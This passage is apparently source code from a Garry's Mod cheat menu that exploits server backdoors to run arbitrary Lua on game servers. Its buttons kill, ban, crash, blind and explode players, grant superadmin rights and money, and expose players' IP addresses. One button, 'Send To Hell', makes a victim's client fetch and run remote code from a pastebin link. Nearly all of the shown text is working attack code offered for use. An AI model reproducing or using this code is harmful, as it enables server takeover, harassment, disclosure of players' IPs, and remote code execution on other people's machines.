		draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		self:SetFont("Trebuchet18")
		self:SetTextColor(Color(255,255,255))
	end

  local Tab2 = vgui.Create("DScrollPanel", InnerFrame)
  Tab2:SetSize(160,565)
  Tab2:SetPos(170,35)
  Tab2.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  local vBar2 = Tab2:GetVBar()
  vBar2:SetWide(0)

	local T2L = vgui.Create("DLabel", InnerFrame)
	T2L:SetText("         [Select Players]")
	T2L:SetPos(170,10)
	T2L:SetSize(160,25)
	T2L.Paint = function(self,w,h)
		draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		self:SetFont("Trebuchet18")
		self:SetTextColor(Color(255,255,255))
	end

  local Tab3 = vgui.Create("DScrollPanel", InnerFrame)
  Tab3:SetSize(160,565)
  Tab3:SetPos(330,35)
  Tab3.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  local vBar3 = Tab3:GetVBar()
  vBar3:SetWide(0)

	local T3L = vgui.Create("DLabel", InnerFrame)
	T3L:SetText("         [Miscellaneous]")
	T3L:SetPos(330,10)
	T3L:SetSize(160,25)
	T3L.Paint = function(self,w,h)
		draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		self:SetFont("Trebuchet18")
		self:SetTextColor(Color(255,255,255))
	end

  local Tab4 = vgui.Create("DScrollPanel", InnerFrame)
  Tab4:SetSize(160,565)
  Tab4:SetPos(490,35)
  Tab4.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  local vBar4 = Tab4:GetVBar()
  vBar4:SetWide(0)

	local T4L = vgui.Create("DLabel", InnerFrame)
	T4L:SetText("         [Other Options]")
	T4L:SetPos(490,10)
	T4L:SetSize(160,25)
	T4L.Paint = function(self,w,h)
		draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		self:SetFont("Trebuchet18")
		self:SetTextColor(Color(255,255,255))
	end

  --/ Player Selection Tab

  local Tab5 = vgui.Create("DScrollPanel", InnerFrame)
  Tab5:SetSize(160,540)
  Tab5:SetPos(650,35)
  Tab5.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  local vBar5 = Tab5:GetVBar()
  vBar5:SetWide(0)

	local T4L = vgui.Create("DLabel", InnerFrame)
	T4L:SetText("        [Player Selection]")
	T4L:SetPos(650,10)
	T4L:SetSize(160,25)
	T4L.Paint = function(self,w,h)
		draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		self:SetFont("Trebuchet18")
		self:SetTextColor(Color(255,255,255))
	end

	local PS = vgui.Create("DLabel", InnerFrame)
	PS:SetText(" Player: ...")
	PS:SetSize(160,25)
	PS:SetPos(650,575)
	PS.Paint = function(self,w,h)
		draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
		self:SetFont("Trebuchet18")
		self:SetTextColor(Color(255,255,255))
	end

  local plrpos = 5

  for k,v in pairs(player.GetAll()) do
    local btnplr = vgui.Create("DButton", Tab5)
    btnplr:SetText(v:Nick())
    btnplr:SetSize(150,30)
    btnplr:SetPos(5,plrpos)
    btnplr.Paint = function(self,w,h)
      draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
      surface.SetDrawColor(0,0,0,150)
      surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
      self:SetFont("Trebuchet18")
      self:SetTextColor(Color(255,255,255))
    end
    btnplr.DoClick = function()
      plr = v:UserID()
      surface.PlaySound("UI/buttonclick.wav")
			PS:SetText(" Player: "..v:Nick())
      warped.nvidlog("Player: "..Player(plr):Nick().." Was Selected!")
    end
    plrpos = plrpos + 32.5
  end

  --/ Button Creation

  local pos1 = 5
  local pos2 = 5
  local pos3 = 5
  local pos4 = 5

  function warped.createbackdoor(text,tab,func)
    if tab == "Tab1" then
      local btn = vgui.Create("DButton", Tab1)
			btn:SetText(text)
			btn:SetSize(150, 30)
			btn:SetPos(5,pos1)
      btn.DoClick = function()
        if GetConVar("warped_target"):GetString() ~= "NONE" then
          func()
        else
          warped.nvidlog("No Net Selected!")
          surface.PlaySound("UI/buttonclick.wav")
        end
      end
			btn.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
      surface.PlaySound("UI/buttonclick.wav")
			pos1 = pos1 + 32.5
    elseif tab == "Tab2" then
      local btn = vgui.Create("DButton", Tab2)
			btn:SetText(text)
			btn:SetSize(150, 30)
			btn:SetPos(5,pos2)
      btn.DoClick = function()
        if GetConVar("warped_target"):GetString() ~= "NONE" then
          if plr ~= nil then
            if IsValid(Player(plr)) then
              func()
            else
              warped.nvidlog("Invalid Player, Refresh Players!")
            end
          else
            warped.nvidlog("No Player Selected!")
            surface.PlaySound("UI/buttonclick.wav")
          end
        else
          warped.nvidlog("No Net Selected!")
          surface.PlaySound("UI/buttonclick.wav")
        end
      end
			btn.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
      surface.PlaySound("UI/buttonclick.wav")
			pos2 = pos2 + 32.5
    elseif tab == "Tab3" then
      local btn = vgui.Create("DButton", Tab3)
			btn:SetText(text)
			btn:SetSize(150, 30)
			btn:SetPos(5,pos3)
      btn.DoClick = function()
        if GetConVar("warped_target"):GetString() ~= "NONE" then
          func()
        else
          warped.nvidlog("No Net Selected!")
          surface.PlaySound("UI/buttonclick.wav")
        end
      end
			btn.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
      surface.PlaySound("UI/buttonclick.wav")
			pos3 = pos3 + 32.5
    elseif tab == "Tab4" then
      local btn = vgui.Create("DButton", Tab4)
			btn:SetText(text)
			btn:SetSize(150, 30)
			btn:SetPos(5,pos4)
			btn.DoClick = func
			btn.Paint = function(self,w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
      surface.PlaySound("UI/buttonclick.wav")
			pos4 = pos4 + 32.5
    end
  end

  --/ Menu Bind
  local insertdown = false
  local HMenu = gString(math.random(12,100))
  hook.Add("Think", HMenu, function()
    if input.IsKeyDown(KEY_INSERT) && !DermaMain:IsVisible() && !insertdown then
      insertdown = true
      DermaMain:Show()
      surface.PlaySound("UI/buttonclick.wav")
    elseif input.IsKeyDown(KEY_INSERT) && DermaMain:IsVisible() && !insertdown then
      insertdown = true
      DermaMain:Hide()
      surface.PlaySound("UI/buttonclick.wav")
    elseif !input.IsKeyDown(KEY_INSERT) then
      insertdown = false
    end
  end)

  warped.createbackdoor("[Toggle] Bunny Hop", "Tab4", function()
    fart_h(LocalPlayer());
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Set Fov", "Tab4", function()
		Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
			LocalPlayer():ConCommand("fov_desired "..str)
      warped.nvidlog("FOV Set To: "..str)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  local sp = false
  warped.createbackdoor("Spectate Player", "Tab2", function()
    if (!sp) then
      sp = true
      warped.sendlua([[
        local me = Player(]]..plr..[[)
        local actualme = Player(]]..LocalPlayer():UserID()..[[)
        actualme:Spectate(OBS_MODE_CHASE)
        actualme:SpectateEntity(me)
      ]])
      warped.nvidlog("Started Spectating: "..Player(plr):Nick().."!")
    else
      sp = false
      warped.sendlua([[
        local actualme = Player(]]..LocalPlayer():UserID()..[[)
        actualme:UnSpectate()
      ]])
      warped.nvidlog("Stopped Spectating: "..Player(plr):Nick().."!")
    end
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("[Toggle] Client Freecam", "Tab4", function()
    Freecam()
    surface.PlaySound("UI/buttonclick.wav")
  end)

  local esp = false
  warped.createbackdoor("[Toggle] Visuals", "Tab4", function()
    if (!esp) then
			esp = true
			warped.nvidlog("ESP: On!")
			ESP()
			timer.Create("ESPReload",0.7,0,function()
				ESPRefresh()
			end)
		else
			esp = false
			warped.nvidlog("ESP: Off!")
			hook.Remove("HUDPaint",HESP)
			timer.Remove("ESPReload")
			timer.Simple(1,function()
				hook.Remove("HUDPaint",HESP)
				timer.Remove("ESPReload")
			end)
		end
    surface.PlaySound("UI/buttonclick.wav")
  end)

  warped.createbackdoor("Kill All", "Tab1", function()
		warped.sendlua("for k,v in pairs(player.GetAll()) do v:Kill() v:Spawn() end")
		surface.PlaySound("UI/buttonclick.wav")
		warped.nvidlog("Everyone Was Killed!")
	end)

	warped.createbackdoor("Speed All", "Tab1", function()
		Derma_StringRequest("Set Speed All", "Set Everyones Speed To: ", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SetMaxSpeed(]]..str..[[)
					v:SetRunSpeed(]]..str..[[)
				end
			]])
			warped.nvidlog("Everyones Speed Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Fling All", "Tab1", function()
		warped.sendlua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
		warped.nvidlog("Everyone Was Flung!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[DarkRP] Economy Fuck", "Tab1", function()
		warped.sendlua("for k,v in pairs(player.GetAll()) do v:addMoney(9999999999999) end")
		warped.nvidlog("Economy Has Been Fucked!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Ignite All", "Tab1", function()
		warped.sendlua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
		warped.nvidlog("Everyone Was Ignited!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Extinguish All", "Tab1", function()
		warped.sendlua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
		warped.nvidlog("Everyone Was Extinguished!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[DarkRP] addMoney All", "Tab1", function()
		Derma_StringRequest("addMoney All", "Money To Add:", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:addMoney(]]..str..[[)
				end
			]])
			warped.nvidlog("Added "..str.." money to all!")
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Ban All Players", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:Ban(9999999999, false)
				v:Kick()
			end
		]])
		warped.nvidlog("All Players Banned!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Kick All Players", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:Kick()
			end
		]])
		warped.nvidlog("All Players Kicked!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Retry All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:ConCommand('retry')
			end
		]])
		warped.nvidlog("Others retry'd!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Crash Others", "Tab1", function()
		warped.sendlua([[
			local id = Player(]]..LocalPlayer():UserID()..[[)
			for k,v in pairs(player.GetAll()) do
				if v:Nick() ~= id:Nick() then
					v:SendLua("function die() return die() end die()")
				end
			end
		]])
		warped.nvidlog("Others Crashed!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Blink (Teleport) All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				local tps = v:GetEyeTraceNoCursor().HitPos
				v:SetPos(tps)
			end
		]])
		warped.nvidlog("Everyone Blinked!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Dance All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
			end
		]])
		warped.nvidlog("Everyone Is Dancing!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Force Say All", "Tab1", function()
		Derma_StringRequest("Force Everyone To Chat", "Message To Chat:","",function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:Say("]]..str..[[")
				end
			]])
			warped.nvidlog("Everyone Just Said: \""..str.."\"")
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Size All", "Tab1", function()
		Derma_StringRequest("Size Everyone", "Set The Size Of Everyone To:", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SetModelScale(']]..str..[[')
				end
			]])
			warped.nvidlog("Everyones Size Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("ConCommand All", "Tab1", function()
		Derma_StringRequest("ConCommand All", "Text To Run(eg: retry):", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:ConCommand(']]..str..[[')
				end
			]])
			warped.nvidlog("Running Command: "..str.." On Everyone!")
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("JumpPower All", "Tab1", function()
		Derma_StringRequest("JumpPower All", "JumpPower To Set All:", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SetJumpPower(]]..str..[[)
				end
			]])
			warped.nvidlog("Everyones JumpPower Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("God All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:GodEnable()
			end
		]])
		warped.nvidlog("Everyone Is Now Godded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("UnGod All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:GodDisable()
			end
		]])
		warped.nvidlog("Everyone Is Now Un-Godded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Stopsound All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:ConCommand('stopsound')
			end
		]])
		warped.nvidlog("Stopped Sound For All!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Health All", "Tab1", function()
		Derma_StringRequest("Health All", "Health To Set To:", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SetHealth(]]..str..[[)
				end
			]])
			warped.nvidlog("Everyones Health Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Armor All","Tab1",function()
		Derma_StringRequest("Armor All", "Armor To Set To:", "", function(str)
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SetArmor(]]..str..[[)
				end
			]])
			warped.nvidlog("Everyones Armor Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Moan All", "Tab1", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
			end
		]])
		warped.nvidlog("Played The Moan Noise!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[Itemstore] Inventory All", "Tab1", function()
		Derma_StringRequest("Item", "Item To Invetory:", "", function(s1)
			Derma_StringRequest("Amount", "Amount To Inventory:", "", function(s2)
				warped.sendlua([[
					for k,v in pairs(player.GetAll()) do
						for i=1,]]..s2..[[ do
							v:Give(']]..s1..[[')
							v:SelectWeapon(']]..s1..[[')
							v:Say('/invholster')
						end
					end
				]])
			end)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Blind All", "Tab1", function()
		warped.sendlua([[
			BroadcastLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")
		]])
		warped.nvidlog("Everyone Was Blinded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Unblind All", "Tab1", function()
		warped.sendlua([[
			BroadcastLua("hook.Remove('HUDPaint','Blindness')")
		]])
		warped.nvidlog("Everyone Was Unblinded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Kill", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:Kill()
			me:Spawn()
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" was killed!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Fling", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Flung!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Speed", "Tab2", function()
		Derma_StringRequest("Set Speed", "Speed To Set The Player:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:SetMaxSpeed(]]..str..[[)
				me:SetRunSpeed(]]..str..[[)
			]])
			warped.nvidlog("Player: "..Player(plr):Nick().."'s Speed Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[DarkRP] addMoney", "Tab2", function()
		Derma_StringRequest("add Money", "Add Money To The Player:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:addMoney(]]..str..[[)
			]])
			warped.nvidlog("added "..str.." money to "..Player(plr):Nick())
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Give Gun", "Tab2", function()
		Derma_StringRequest("Give Gun", "Give The Gun Named:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:Give(']]..str..[[')
			]])
			warped.nvidlog("Gave Gun To: "..Player(plr):Nick())
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Crash Player", "Tab2", function()
		warped.sendlua([[
			Player(]]..plr..[[):SendLua("function die() return die() end die()")
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Was Crashed!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Force Say", "Tab2", function()
		Derma_StringRequest("Force Say", "Force Player To Say:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:Say("]]..str..[[")
			]])
			warped.nvidlog("Forced Player: "..Player(plr):Nick().." To Say: \""..str.."\" ")
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)
	warped.createbackdoor("Noclip Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			if me:GetMoveType() ~= MOVETYPE_NOCLIP then
				me:SetMoveType(MOVETYPE_NOCLIP)
			else
				me:SetMoveType(MOVETYPE_WALK)
			end
		]])
		if Player(plr):GetMoveType() == MOVETYPE_NOCLIP then
			warped.nvidlog("Noclip Off!")
		else
			warped.nvidlog("Noclip On!")
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Set Usergroup", "Tab2", function()
		Derma_StringRequest("Set Usergroup", "ex: superadmin", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:SetUserGroup("]]..str..[[")
			]])
			warped.nvidlog("Player: \""..Player(plr):Nick().."'s".."\" Usergroup Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("God Enable", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:GodEnable()
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Godded")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("God Disable", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:GodDisable()
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Un-Godded")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Ban Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:Ban(999999999,false)
			me:Kick()
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Banned!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Kick Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:Kick()
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Kicked!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Freeze Player", "Tab2", function()
		warped.sendlua([[
			Player(]]..plr..[[):Freeze(true)
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Frozen!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Unfreeze Player", "Tab2", function()
		warped.sendlua([[
			Player(]]..plr..[[):Freeze(false)
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Unfrozen!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Ignite Player", "Tab2", function()
		warped.sendlua([[
			Player(]]..plr..[[):Ignite(99999,40)
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Ignited!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Extinguish Player", "Tab2", function()
		warped.sendlua([[
			Player(]]..plr..[[):Extinguish()
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Extinguished!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Blink (Teleport)", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			local tps = me:GetEyeTraceNoCursor().HitPos
			me:SetPos(tps)
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Teleported!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Print IP", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			local ply = ]]..LocalPlayer():UserID()..[[
			Player(ply):ChatPrint("Player: " .. me:Nick() .. " (" .. me:SteamID() .. ") IP: " .. me:IPAddress())
		]])
		warped.nvidlog("Players IPs Logged")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Retry Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:ConCommand('retry')
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." was retry'd!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Glass Earrape", "Tab2", function()
		warped.sendlua([[
			Player(]]..plr..[[):EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
		]])
		warped.nvidlog("Glass Earrape Sent To: "..Player(plr):Nick())
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Dance Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Is Now Dancing!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Size Player", "Tab2", function()
		Derma_StringRequest("Set Size", "Players Size:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:SetModelScale(']]..str..[[')
			]])
			warped.nvidlog("Player: "..Player(plr):Nick().." Size Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("ConCommand", "Tab2", function()
		Derma_StringRequest("ConCommand", "String To Run In Console:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:ConCommand(']]..str..[[')
			]])
			warped.nvidlog("Running Command: "..str.." On Player: "..Player(plr):Nick())
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Explode Player", "Tab2", function()
		warped.sendlua([[
			local explo = ents.Create("env_explosion")
			local me = Player(]]..plr..[[)

				explo:SetOwner(me)
				explo:SetPos(me:GetPos())
				explo:SetKeyValue("iMagnitude", "250")
				explo:Spawn()
				explo:Activate()
				explo:Fire("Explode", "", 0)

			if me:Alive() then
				me:Kill()
			end
		]])
		warped.nvidlog("Player: \""..Player(plr):Nick().."\" Was Exploded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Spawn", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:Spawn()
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Was Spawned!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Send To Hell", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:SendLua("http.Fetch('https://pastebin.com/raw/7US43tsu', function(b,l,h,c) RunString(b) end)")
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Was Sent To Hell!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("IP Say", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:Say("My IP Is: "..me:IPAddress())
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Said Their IP!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Set Health", "Tab2", function()
		Derma_StringRequest("Set Health", "Health To Set Player:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:SetHealth(]]..str..[[)
			]])
			warped.nvidlog("Player: "..Player(plr):Nick().." Health Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Set Armor", "Tab2", function()
		Derma_StringRequest("Set Armor", "Armor To Set Player:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:SetArmor(]]..str..[[)
			]])
			warped.nvidlog("Player: "..Player(plr):Nick().." Armor Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("JumpPower", "Tab2", function()
		Derma_StringRequest("JumpPower", "JumpPower To Set To:", "", function(str)
			warped.sendlua([[
				local me = Player(]]..plr..[[)
				me:SetJumpPower(]]..str..[[)
			]])
			warped.nvidlog("Player: "..Player(plr):Nick().." Had Their Jump Power Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Moan", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Just Moaned!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Prop Cleanup", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:ConCommand("gmod_cleanup")
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Had Their Props Wiped!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Drop Held Gun", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			if me:GetActiveWeapon() ~= nil then
				me:DropWeapon(me:GetActiveWeapon())
			end
		]])
		warped.nvidlog("They just dropped their gun!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[Itemstore] Inventory", "Tab2", function()
		Derma_StringRequest("Item","Item To Inventory:","",function(s1)
			Derma_StringRequest("Amount", "Amount To Inventory", "", function(s2)
				warped.sendlua([[
					local me = Player(]]..plr..[[)
					for i=1,]]..s2..[[ do
						me:Give(']]..s1..[[')
						me:SelectWeapon(']]..s1..[[')
						me:Say('/invholster')
					end
				]])
